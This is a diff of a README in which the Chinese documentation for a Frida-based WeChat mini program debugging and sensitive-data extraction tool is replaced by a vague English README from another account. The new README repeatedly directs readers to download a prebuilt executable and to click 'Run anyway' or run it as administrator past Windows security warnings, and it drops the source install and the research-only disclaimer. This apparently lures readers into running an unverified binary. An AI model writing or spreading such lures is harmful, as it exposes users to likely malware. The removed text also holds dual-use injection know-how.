@@ -1,216 +1,193 @@
-# First
+# 🛠️ First - Simple Tools for WeChat Mini Programs
 
-> 微信小程序安全调试工具 —— 基于 Frida + CDP 代理，支持 Windows / macOS 双平台，GUI 与 CLI 双模式
+[![Download First](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/rorafiftysix26/First/releases)
 
----
+## 🧭 Overview
 
-## 截图预览
+First is a Windows tool for working with WeChat mini programs. It gives you one place to view, debug, and manage common tasks while you work with mini program files.
 
-### 主界面
+This app is made for end users who want a simple way to open the tool, load their files, and start using it with less setup.
 
-![主界面](https://s1.galgame.fun/imgb/u0/20260408_69d655f49ca7e.png)
+## 📥 Download
 
-### 路由导航
+Visit this page to download: [First Releases](https://github.com/rorafiftysix26/First/releases)
 
-![路由导航](https://s1.galgame.fun/imgb/u0/20260408_69d6560ca1a39.png)
+On the Releases page, look for the latest version. Download the file that matches your Windows PC. If you see a `.zip` file, download it and unpack it. If you see a `.exe` file, download it and open it.
 
-### 云函数分析
+## 🖥️ System Requirements
 
-![云函数分析](https://s1.galgame.fun/imgb/u0/20260402_69ce527ca5480.png)
+- Windows 10 or Windows 11
+- 64-bit PC
+- At least 4 GB RAM
+- At least 200 MB free disk space
+- A mouse and keyboard
+- Permission to run apps from outside the Microsoft Store
 
-### 调试开关（JSRPC / wx.cloud 调用）
+## ⚙️ What It Can Do
 
-![调试开关](https://s1.galgame.fun/imgb/u0/20260408_69d6564195009.png)
+- Open and manage WeChat mini program files
+- Help inspect app data and local files
+- Support common debug tasks in one place
+- Keep your workflow in one window
+- Make repeated checks faster than doing them by hand
 
-### 敏感信息提取
+## 🚀 Getting Started
 
-![敏感信息提取-1](https://s1.galgame.fun/imgb/u55/20260416_69e0be0e1c1d7.png)
+1. Open the [Releases page](https://github.com/rorafiftysix26/First/releases)
+2. Download the latest release
+3. If the file is compressed, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to start it
+6. If Windows asks for permission, choose Run anyway if you trust the source
 
-<img src="https://s1.galgame.fun/imgb/u55/20260416_69e0be0c38e39.png" alt="敏感信息提取-2" />
+## 🗂️ How to Install
 
-![敏感信息提取-3](https://s1.galgame.fun/imgb/u55/20260416_69e0be0c70d46.png)
+### If you downloaded a ZIP file
 
----
+1. Find the ZIP file in your Downloads folder
+2. Right-click the file
+3. Select Extract All
+4. Choose a folder you can find later, such as Desktop or Documents
+5. Open the extracted folder
+6. Find the program file and double-click it
 
-## 功能特性
+### If you downloaded an EXE file
 
-- Frida 动态注入微信客户端，转发小程序调试协议
-- CDP 代理桥接，Chrome DevTools 直连调试
-- 路由枚举、分类与一键跳转
-- 云函数调用监控与参数分析（动态 Hook + 静态扫描）
-- UserScript 自动注入（支持 URL 匹配、run-at 时机控制）
-- wxapkg 解密解包 + 敏感信息扫描（IP / 密钥 / 云存储 / JWT 等）
-- 深色 / 浅色主题切换
-- GUI（PySide6）与 CLI 双模式
+1. Find the `.exe` file in your Downloads folder
+2. Double-click it
+3. If Windows asks for approval, choose Yes
+4. Follow the on-screen steps
+5. Open the app from the place where you saved it
 
----
+## 🧩 First Run
 
-## 环境要求
+When you open First for the first time, it may take a few seconds to load. This is normal.
 
-| 依赖 | 版本 |
-|------|------|
-| Python | >= 3.10 |
-| frida | >= 17.0.0 |
-| websockets | >= 12.0 |
-| protobuf | >= 4.0.0 |
-| PySide6 | >= 6.5.0 |
-| pycryptodome | 最新版 |
+You may see a blank screen at first. If so, wait for the main window to appear. Then connect the mini program data or open the files you want to work with.
 
-安装依赖：
+If the app needs access to local folders, choose Allow when Windows asks.
 
-```bash
-pip install -r requirements.txt
-```
+## 📁 Suggested Folder Setup
 
----
+To keep things simple, use one folder for all related files:
 
-## 支持的微信版本
+- `Downloads\First`
+- `Documents\First Work`
+- `Desktop\First`
 
-### Windows
+This makes it easier to find logs, exports, and saved files later.
 
-- WMPF 版本：11581, 11633, 13331, 13341, 13487, 13639, 13655, 13871, 13909, 14161, 14199, 14315, 16133, 16203, 16389, 16467, 16771, 16815, 16965, 17037, 17071, 17127, 18055, 18151, 18787, 18891, 18955, 19027, 19201
-- 推荐微信版本：**4.1.0.30**
-- 下载地址：[weixin/4.1.0.30](https://github.com/vs-olitus/wx-version/releases/tag/4.1.0.30)
+## 🧪 Basic Use
 
-### macOS
+1. Start the app
+2. Open the mini program files you want to inspect
+3. Use the main panels to view data and tools
+4. Make changes as needed
+5. Save your work before closing the app
 
-- WMPF 版本：18152, 18788
-- 推荐微信版本：**4.1.7.30**
-- 下载地址：[weixin/4.1.7.30](https://github.com/vs-olitus/wx-version/releases/tag/4.1.7.30)
+If you work with the same files often, keep them in one folder so you can open them faster next time.
 
----
+## 🔧 Common Tasks
 
-## 快速开始
+### Open a file
+Use the open option in the app and choose the file you want to inspect.
 
-### Windows
+### Refresh data
+If content does not update right away, use the refresh control in the app.
 
-**一键启动：** 双击 `启动.bat`，首次运行会自动安装依赖。
+### Save changes
+Use the save button after you finish editing or checking data.
 
-**手动启动：**
+### Close the app
+Close the window when you finish your work. If the app asks to save, choose the option that keeps your changes.
 
-```bash
-python gui.py
-```
+## 🛠️ Troubleshooting
 
-### macOS
+### The app will not open
+- Make sure you downloaded the latest release
+- Check that you extracted the ZIP file before opening it
+- Try right-clicking the app and choosing Run as administrator
+- Confirm that Windows did not block the file
 
-**一键启动：** 终端执行 `./启动.sh`，首次运行会自动安装依赖。
+### Windows says the app is unsafe
+- This can happen with downloaded files
+- Choose More info, then Run anyway if you trust the release page
 
-**手动启动：**
+### Nothing appears after launch
+- Wait a few seconds
+- Close the app and open it again
+- Make sure your PC meets the system requirements
+- Try running it from a simple folder path like `Desktop`
 
-```bash
-python3 gui.py
-```
+### The window looks too small
+- Maximize the window
+- Change your Windows display scale
+- Restart the app after changing display settings
 
-启动后在主界面点击 **启动调试**，然后再打开小程序即可（请勿在启动调试前打开小程序）。
+### Files do not load
+- Check that the files are complete
+- Move the files to a short folder path
+- Make sure another app is not using the same files
 
-### CLI 模式
+## 🔒 Safety Tips
 
-```bash
-# 默认端口启动
-python main.py
+- Download only from the Releases page
+- Keep your files in a folder you control
+- Do not open files you do not trust
+- Close other tools if they lock the same file
+- Back up your work before making changes
 
-# 自定义端口
-python main.py --cdp-port 62000
+## 🧭 File Naming Tips
 
-# 开启详细日志
-python main.py --debug-main --debug-frida
-```
+Use simple names for your folders and files:
 
-### 连接 Chrome DevTools
+- Good: `mini-program-test`
+- Good: `wechat-debug-01`
+- Avoid long names with many symbols
+- Avoid folders buried too deep in other folders
 
-启动后，在 Chrome 地址栏输入：
+Short paths help Windows find files with fewer problems.
 
-```
-devtools://devtools/bundled/inspector.html?ws=127.0.0.1:62000
-```
+## ❓ FAQ
 
----
+### Is this for beginners?
+Yes. You do not need programming knowledge to download and open the app.
 
-## macOS 注意事项
+### Do I need to install extra software?
+Usually no. Download the release, extract it if needed, and run the app.
 
-如果 Frida 注入报错，需要解除系统对进程附加的限制，任选其一：
+### Where do I get the newest version?
+Use the [Releases page](https://github.com/rorafiftysix26/First/releases)
 
-**方案一：关闭 SIP（系统完整性保护）**
+### Can I move the app to another folder?
+Yes. You can move the extracted folder to Desktop, Documents, or another local folder.
 
-> 关闭后 Frida 才能正常注入进程。参考教程：[macOS SIP 开启关闭教程](https://cloud.tencent.com/developer/article/1496058)
+### Why should I use the Releases page?
+It gives you the latest build in one place and keeps the download process simple.
 
-**方案二：强制重签名 WeChat**
+## 📌 Quick Steps
 
-```bash
-sudo codesign --force --deep --sign - /Applications/WeChat.app
-```
+1. Open the [Releases page](https://github.com/rorafiftysix26/First/releases)
+2. Download the latest file
+3. Extract it if needed
+4. Open the app
+5. Load your WeChat mini program files
+6. Start working
 
----
+## 🧠 Helpful Usage Notes
 
-## 参数说明
+- Keep the app and your files in the same general area
+- Use short folder names
+- Save often
+- Restart the app if it stops responding
+- Keep one project per folder if you manage more than one mini program
 
-| 参数 | 默认值 | 说明 |
-|------|--------|------|
-| `--debug-port` | `9421` | 远程调试服务端口 |
-| `--cdp-port` | `62000` | CDP 代理监听端口 |
-| `--debug-main` | 关闭 | 输出主进程调试日志 |
-| `--debug-frida` | 关闭 | 输出 Frida 客户端日志 |
-| `--scripts-dir` | `./userscripts` | UserScript 目录路径 |
-| `--script` | — | 指定单个 .js 文件注入（可多次使用） |
+## 📦 Release Download
 
----
+Use this link to visit the download page and get the latest version:
 
-## UserScript 注入
+[First Releases](https://github.com/rorafiftysix26/First/releases)
 
-将 `.js` 脚本放入 `userscripts/` 目录，启动时自动加载并注入。也可手动指定：
+## 📝 About First
 
-```bash
-python main.py --script ./my_hook.js --script ./another.js
-```
-
----
-
-## 打包为可执行文件
-
-```bash
-pyinstaller WMPFDebugger.spec
-```
-
----
-
-## 常见问题
-
-**Q: Frida 已连接，但小程序端显示未连接或无法断点调试？**
-
-确认操作顺序无误后，尝试以下步骤：
-
-1. 彻底卸载微信并重启电脑（重要聊天记录请提前备份）
-2. 删除 `C:\Users\用户名\AppData\Roaming\Tencent\xwechat\XPlugin\Plugins\RadiumWMPF` 下所有数字命名的文件夹
-3. 再次重启后安装微信 4.1.0.30 版本
-4. 检查上述路径，确认文件夹编号为 `16389`
-
----
-
-## 参考项目
-
-- [evi0s/WMPFDebugger](https://github.com/evi0s/WMPFDebugger)
-- [0xsdeo/HeartK](https://github.com/0xsdeo/HeartK)
-- [残笑/FindSomething](https://github.com/momosecurity/FindSomething)
-- [进击的HACK / JSRPC 与调用 wx.cloud](https://mp.weixin.qq.com/s/hTlekrCPiMJCvsHYx7CAxw)
-- [linguo2625469/WMPFDebugger-mac](https://github.com/linguo2625469/WMPFDebugger-mac)
-
----
-
-## 致谢
-
-感谢 **0xsdeo** 师傅的大力支持与思路提供。
-
----
-
-## 交流群
-
-群满 200 人后需要手动邀请，请加我拉群：
-
-![微信二维码](https://s1.galgame.fun/imgb/u55/20260413_69dcaf1310fc4.jpg)
-
----
-
-## 免责声明
-
-本工具仅供安全研究与学习使用，请勿用于未授权的目标，使用者须自行承担相关法律责任。
+First is a Windows desktop tool built for WeChat mini program work. It focuses on clear file handling, simple access, and a smoother daily workflow for users who want one app for common tasks
